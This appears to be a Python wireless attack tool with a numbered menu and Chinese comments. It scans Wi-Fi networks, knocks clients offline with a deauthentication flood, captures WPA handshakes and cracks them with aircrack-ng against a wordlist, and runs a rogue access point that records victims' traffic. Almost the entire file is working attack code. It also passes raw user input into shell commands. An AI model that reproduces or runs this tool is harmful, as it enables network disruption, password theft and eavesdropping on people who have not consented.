#coding=utf-8

'''
This is a demo for you to write a function module.
'''
from prompt_toolkit.validation import Validator, ValidationError
import time
import subprocess
import sys
from scapy.all import *
from threading import Thread
import os
import pandas
#声明DataFrame
networks = pandas.DataFrame(columns=["BSSID", "dBm_Signal", "CH", "ENC", "SSID"])
networks.set_index("BSSID", inplace = True)

# 输入类型检测函数
def is_number(text):
    return text.isdigit()   # 确认输入是否全由数字组成

validator = Validator.from_callable(
    is_number,  # 在这调用
    error_message='This input contains non-numeric characters',
    move_cursor_to_end=True)

def loop(session):
    # 在这里实现相关的逻辑
    print('[*] Enteryour selection, 1 for scanning wifi, 2 for dos wifi, 3 for attack wifi password, 4 for building fake wifi AP')
    while True:
        number = int(session.prompt('[-] Give me a number: ', validator=validator))
        print('[-] You said: %i' % number)
        if number == 0:
            print('[*] Goodbye :D')
            break
        if number == 1:
            print("please waiting....")
            scanwifilist()
            BSSID = input("[-] input target BSSID: ")
            channel = input("[-] input target CH: ")
        if number == 2:
            doswifi(BSSID)
        if number == 3:
            attack_wifi_password(BSSID, channel)
        if number == 4:
            fake_AP()
    return
#-----------------------
def callback(packet, ):
    if packet.haslayer(Dot11Beacon):
         bssid = packet[Dot11].addr2
         ssid = packet[Dot11Elt].info.decode()
         try:
               dbm_signal = packet.dBm_AntSignal
         except:
               dbm_signal = "N/A"
         stats = packet[Dot11Beacon].network_stats()
         CH = stats.get("channel")
         ENC = stats.get("crypto")
         networks.loc[bssid] = (dbm_signal, CH, ENC, ssid)

def change_channel(interface):
    ch = 1
    start_time = time.time()
    exe_time = 10
    while time.time() < start_time + exe_time:
        os.system(f"iwconfig {interface} channel {ch}")
        ch = ch % 14 + 1
        time.sleep(0.5)
def scanwifilist():
    interface = "wlan0mon"
    channel_changer = Thread(target=change_channel, args=(interface, ))
    channel_changer.daemon = True
    channel_changer.start()
    p = sniff(prn = callback, iface = interface, timeout = 40)
    time.sleep(10)
    print(networks)
#---------------------
def attack_wifi_password(BSSID, channel):
	filepath = os.getcwd() + '/functions/cap/'#当前路径
	if not os.listdir(filepath):
		pass
	else:
		file_list = os.listdir(filepath)
		for fil in file_list:
			file_path = os.path.join(filepath, fil)
			os.remove(file_path)
	os.system("airmon-ng stop wlan0mon")
	os.system("service networking restart")
	os.system("airmon-ng check kill")
	os.system("airmon-ng start wlan0")
	shake_hands = subprocess.Popen('exec airodump-ng -c ' + channel + ' --bssid ' + BSSID + ' -w ' + filepath + ' wlan0mon', shell=True, stdout=subprocess.PIPE)
	print("等待获取握手包中....")
	while True:
		out = shake_hands.stdout.readline()
		out = out.decode('UTF-8')
		print(out)
		if 'handshake' in out:
			break
	print("握手包抓取成功")
	time.sleep(8)
	shake_hands.kill()
	cipher_dictionary = os.getcwd() + '/password.txt '
	capfile = filepath + '-01.cap'
	print("暴力破解密码中....")
	password_attack = subprocess.Popen('exec aircrack-ng -w ' + cipher_dictionary + capfile, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	outs, errs = password_attack.communicate()
	outs = outs.decode("UTF-8")
	errs = errs.decode("UTF-8")
	print(outs)
	print(errs)
	time.sleep(10)
	password_attack.kill()
#---------------------
def doswifi(BSSID):
    dos = subprocess.Popen('exec aireplay-ng -a ' + BSSID + ' -o 1 --deauth 100 -D wlan0mon', shell=True)
    time.sleep(15)
    dos.wait()
    print("强制离线已完成")
#--------------------
def fake_wifi():
	##修改hostapd文件
	hostapd = subprocess.Popen('exec hostapd hostapd.conf', shell=True)
	os.system('ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0')
	os.system('route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1')
	dnsmasq = subprocess.Popen('exec dnsmasq -C dnsmasq.conf -d', shell=True)
	os.system('iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE')
	os.system('iptables --append FORWARD --in-interface wlan0mon -j ACCEPT')
	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')



def getcap(time):
	wk = 'wlan0mon'
	packet = sniff(iface= wk , prn = lambda x: x.summary(), store = 1,timeout = time) 
	wrpcap('packet.cap', packet)
	print("抓包完成")

def fake_AP():
	snifftime = input("选择抓包时长<单位为秒>：")
	snifftime = int(snifftime)
	fake_wifi()
	getcap(snifftime)
	os.system('killall dnsmasq')
	os.system('killall hostapd')
	os.system('ifconfig wlan0mon down')
	os.system('iwconfig wlan0mon mode monitor')
	os.system('ifconfig wlan0mon up')
#--------------------------------------------
















